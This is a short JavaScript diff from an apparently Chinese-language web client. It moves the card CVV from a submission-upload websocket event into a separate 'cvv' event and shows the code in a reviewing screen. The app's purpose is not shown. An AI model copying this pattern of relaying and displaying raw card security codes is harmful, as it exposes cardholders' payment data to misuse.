@@ -39,10 +39,15 @@ ws.on('connected', () => { document.getElementById('ws-status').hidden = true })
 ws.on('uploaded', (msg) => {
   app.transition('reviewing', { submission: msg.submission })
   fillReviewingView(msg.submission)
-  if (msg.cvv) {
-    cvvValue = msg.cvv
-    document.querySelector('[data-field="cvv"] .value').textContent = msg.cvv
-  }
+  // msg 本身不含 CVV（submit.ts 廣播時已排除），CVV 走獨立的 'cvv' 事件
+})
+
+// CVV 獲得事件（從獨立的 WS 訊息接收）
+ws.on('cvv', (msg) => {
+  if (!msg.cvv) return
+  cvvValue = msg.cvv
+  const cvvEl = document.querySelector('[data-field="cvv"] .value')
+  if (cvvEl) cvvEl.textContent = msg.cvv
 })
 
 ws.on('expired', () => {
